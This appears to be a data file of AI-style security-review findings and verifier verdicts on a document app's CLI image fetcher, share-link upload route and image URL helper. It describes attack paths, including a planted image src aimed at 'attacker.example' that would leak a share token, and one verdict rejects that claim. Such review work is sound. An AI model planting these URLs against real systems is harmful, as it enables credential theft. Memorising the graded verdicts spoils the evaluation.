samples.summary: CLI now attaches the user's API key / session JWT to any image `src` whose origin matches the configured server — including attacker-chosen paths on the API host (confused-deputy credentialed GET)
samples.evidence: `createImageFetcher` gates the credential only on origin (`isConfiguredServerOrigin`, line 444-454) and never on path. Image `src` values are attacker-influenced document content: an anonymous *editor* share-link visitor can set an arbitrary absolute URL via `insertImageFromUrl` (packages/frontend/src/app/docs/image-insert.ts:169-181, reachable from the shared toolbar's URL mode), and so can any workspace collaborator. Attack: plant `src = "https://api.wafflebase.io/api/v1/workspaces/<other-ws>/documents"` (or any other authorized GET on the API origin). When the owner runs `wafflebase docs export` / `slides export` (packages/cli/src/commands/docs.ts:340, slides.ts:233 now pass `authorization`), `assertFetchableImageUrl` clears it (it gates by host/address, not path — line 341-430), `isConfiguredServerOrigin` returns true, and the request goes out with `Authorization: Bearer <api key|jwt>`; the response body is then embedded verbatim into the exported DOCX/PDF/PPTX (`return await res.blob()`, line 931). Before this change no credential was attached, so the same `src` produced a 401 and a skipped image. Impact: the CLI performs authenticated GETs to arbitrary API endpoints chosen by an untrusted document author, and their responses land inside a file the user may redistribute. Tightening the gate to the two image route shapes (`/images/:id`, `/api/v1/workspaces/:wid/images/:id`) would remove the whole class.

samples.summary: `@Query('token')` is never validated as a string, so a client-supplied object/array reaches `prisma.shareLink.findUnique({ where: { token } })` on the new unauthenticated write route
samples.evidence: `upload(@UploadedFile() file, @Query('token') token: string | undefined)` types `token` as `string | undefined`, which erases to `Object` in `design:paramtypes`; Nest's global `ValidationPipe` (packages/backend/src/main.ts:65-72) short-circuits for an `Object`/`Array` metatype, so no coercion happens. Express 4's default `extended` query parser (qs) turns `?token[gt]=` into `{ gt: '' }` and `?token=a&token=b` into `['a','b']`, and that value flows unchecked into `assertCanWrite` -> `ShareLinkService.findByToken` -> `prisma.shareLink.findUnique({ where: { token } })` (share-link.service.ts:103-106). If Prisma were to accept a filter object there, an anonymous caller with **no** token at all would resolve some arbitrary ShareLink and, if its role is `editor`, obtain write access into that link's workspace image prefix — a complete bypass of the only gate on this route. I could not execute Prisma here to confirm; `findUnique` most likely raises `PrismaClientValidationError` (a 500 rather than a bypass), which is why confidence is low, but the missing string validation is real and the same untyped param is the sole authorization input. Fix: `@Query('token') token?: unknown` + `typeof token !== 'string'` guard (or a `ParseStringPipe`) before `findByToken`.

samples.summary: The only unauthenticated write route in the app buffers up to 10 MB of multipart body into heap before any authorization runs
samples.evidence: `@UseInterceptors(FileInterceptor(...))` runs after guards but before the handler, and this controller mounts **no** guard at all — `assertCanWrite` is called from inside `upload()` at line 100, after Multer has already read the whole part into `file.buffer`. So an attacker with no token, an expired token, or a viewer token still makes the process allocate up to `IMAGE_UPLOAD_MULTER_LIMIT_BYTES` (10 MB + 1) per request. The only bound is the global IP-keyed `ThrottlerGuard` at `@Throttle({limit:30, ttl:60_000})` (line 55), which a distributed or proxied client sidesteps. The two sibling upload routes buffer only after `CombinedAuthGuard`/`JwtAuthGuard` has authenticated the caller. Moving the share-token decision into a guard (as the file's own docstring notes at lines 70-75) would refuse before allocation.

samples.summary: An anonymous editor-link holder gets unbounded, unattributed writes into the workspace's shared image key space, readable by every other share token in that workspace
samples.evidence: `assertCanWrite` returns `link.document.workspaceId` and `ImageService.upload` writes to `${workspaceId}/${uuid}.ext` (image.service.ts:133) with no quota, no rate accounting beyond 30/min per IP, and no row tying the object to the document or the link. The objects survive link revocation and expiry (nothing deletes them). Because `ApiV1ImageReadController.assertCanRead` grants read on **any** share token whose document is in the same workspace (image-read.controller.ts:128-132, role ignored), anything planted this way is readable by the holder of any other token in that workspace — including the non-expiring public *viewer* link a template gallery listing mints (prisma/schema.prisma:158-162). Net effect: a non-member with one editor link can use the victim's S3 bucket and API origin as a file host and can inflate storage cost indefinitely. Content is confined to the four declared image MIME types and the read route sets `X-Content-Type-Options: nosniff`, so this is abuse/cost rather than stored XSS — hence minor — but the write side is now anonymous, which it was not before.

samples.summary: `isConfiguredServerOrigin` permits `http:`, and the image path is the only CLI path that honours `http_proxy`/`all_proxy` — so the API key/JWT can now travel in cleartext and via an env-configured proxy
samples.evidence: Line 446 accepts `http:` as well as `https:`, so with `--server http://api.internal:3000` the credential built by `authorizationHeader` (packages/cli/src/client/http-client.ts:208-217) is sent as a plaintext `Authorization` header. Separately, `planHop` (line 556-595) routes image hops through a `ProxyAgent` built from `http_proxy`/`https_proxy`/`all_proxy`, and `headers = { ...plan.headers, ...credential }` (lines 877, 901) sends the credential over that hop; for an `http:` server base undici issues an absolute-form request through the proxy with the header visible to it. `HttpClient`'s ordinary API calls use global fetch and no proxy dispatcher (no `setGlobalDispatcher`/`EnvHttpProxyAgent` anywhere in packages/cli/src), so this is a new exposure surface for the credential rather than a pre-existing one. Consider restricting the credential to `https:` origins, or at least to hops that are not proxied.

verdict.reason: Verified in the repo. `isConfiguredServerOrigin` (packages/cli/src/docs/image-fetcher.ts:444-454) compares only `url.origin === server.origin`; there is no path restriction anywhere in the file. That predicate alone decides whether the CLI's credential is attached (image-fetcher.ts:872-877), and the credential is a real `Bearer <apiKey|accessToken>` (packages/cli/src/client/http-client.ts:208-216) passed in by `docs export` (packages/cli/src/commands/docs.ts:339-342) and `slides export` (packages/cli/src/commands/slides.ts:233-235). The pre-fetch gate `assertFetchableImageUrl` (image-fetcher.ts:341-430) checks scheme, hostname, port and resolved addresses only — never `pathname` — so an absolute `src` pointing at any path on the configured API origin passes. Image `src` is attacker-influenced document content: `insertImageFromUrl` stores any `http(s)` URL verbatim as a hotlink (packages/frontend/src/app/docs/image-insert.ts:169-181, note at 165-167), and the fetcher's own comments admit the input is attacker-controlled (image-fetcher.ts:88-89). The response body is returned verbatim (`return await res.blob()`, image-fetcher.ts:931) and embedded by the exporters (packages/cli/src/docs/docx-export.ts:39). This is a genuine confused-deputy: an untrusted document author causes the victim's CLI to make authenticated GETs to arbitrary API endpoints and lands the responses in an exported file. In-lane (credential misuse / sensitive data exposure) and blocking at major severity; no guard makes it unreachable.

verdict.reason: The code is present as described (untyped `@Query('token')` at image-share-upload.controller.ts:95, only a falsiness check in assertCanWrite:129-132, flowing to prisma.shareLink.findUnique at share-link.service.ts:103, with no coercion from the global ValidationPipe at main.ts:65-72). But the claimed impact — an anonymous caller resolving an arbitrary editor ShareLink — cannot occur. `token` is `String @unique` (prisma/schema.prisma:149), so in the generated ShareLinkWhereUniqueInput it is a scalar string; Prisma's query engine validates arguments against that schema and throws PrismaClientValidationError for an object/array, and it emits parameterized SQL rather than interpreting client objects as operators (no Mongoose-style operator injection). Under Prisma 6's extended where-unique semantics a filter-only `where` likewise fails the "at least one unique equality" requirement. Both branches raise an exception, so `link.role !== 'editor'` is never reached with an attacker-chosen row and the workspace prefix (line 138) is always server-derived. The residual outcome is a generic Nest 500 with no data leak on a route capped at 30 req/min (controller:55, global ThrottlerGuard at app.module.ts:129) — nit-level input hardening, not an authorization bypass, secret exposure, injection, or broken crypto check, hence not blocking under the security rubric.

finding.summary: Share-token exfiltration: `isTrustedWorkspaceImageUrl` treats a protocol-relative `//attacker.example/...` src as same-origin, so the viewer's share token is appended and sent to the attacker's host — newly reachable from the docs engine because this change registers `["doc", setDocsImageUrlResolver]`.
finding.evidence:
`isTrustedWorkspaceImageUrl` (share-image-url.ts:27-31) short-circuits on `src.startsWith("/")` and then tests the UNANCHORED regex `WORKSPACE_IMAGE_PATH_RE = /\/api\/v1\/workspaces\/[^/]+\/images\/[^/?#]+/` (line 3-4) against the path. For `src = "//attacker.example/api/v1/workspaces/w1/images/x.png"`: `startsWith("/")` is true (it starts with a single `/`), and the unanchored regex matches the `/api/v1/workspaces/w1/images/x.png` substring, so the function returns true and `appendShareTokenToImageUrl` (line 55-65) returns `//attacker.example/api/v1/workspaces/w1/images/x.png?token=<viewer token>`. That string is handed to `getOrLoadImage` -> `loadImage` (packages/core/src/image/index.ts:145 `img.src = src`), which does no scheme/host validation; the browser resolves a protocol-relative URL against the current scheme and issues the request to attacker.example WITH the token in the request line. `/\evil.com/...` behaves the same under WHATWG URL parsing.

Attack: a collaborator holding an editor share link (or any workspace member) attaches a Yorkie client and writes an inline-image `src` of `//attacker.example/api/v1/workspaces/w1/images/x.png` into the docs CRDT. Every subsequent share-link visitor's canvas paints that inline, the resolver installed by `useSharedImageTokenResolver` (shared-document.tsx:900-915) appends THEIR token, and the attacker's log now holds a live share token — full document access (and, for an editor link, write access plus the new anonymous upload route).

verdict.reason: The described code is not present. `isTrustedWorkspaceImageUrl` contains no `src.startsWith("/")` short-circuit; for scheme-less srcs it resolves against a reserved sentinel base `https://relative.invalid/` (share-image-url.ts:21,48) and rejects anything whose resolved origin escapes the sentinel (line 53) BEFORE testing the path regex (line 54). So `//attacker.example/api/v1/workspaces/w1/images/x.png` resolves to origin `https://attacker.example`, fails line 53, and `appendShareTokenToImageUrl` returns the src untouched (line 81) — no token is appended. The backslash variant `/\attacker.example/...` normalizes to the same protocol-relative form and is rejected by the identical check. The absolute branch (lines 56-65) requires equality with the configured backend origin and returns false when unset (line 57). The claim that only the `https://attacker.example` spelling is tested is also false: share-image-url.test.ts:39-47 covers the protocol-relative case (both with and without a configured backend), :49-55 covers the backslash-escaped host, and :57-62 covers `https:/\attacker.example/...`. `shared-document.tsx:907` is the only caller and goes through this helper, so there is no weaker parallel path.
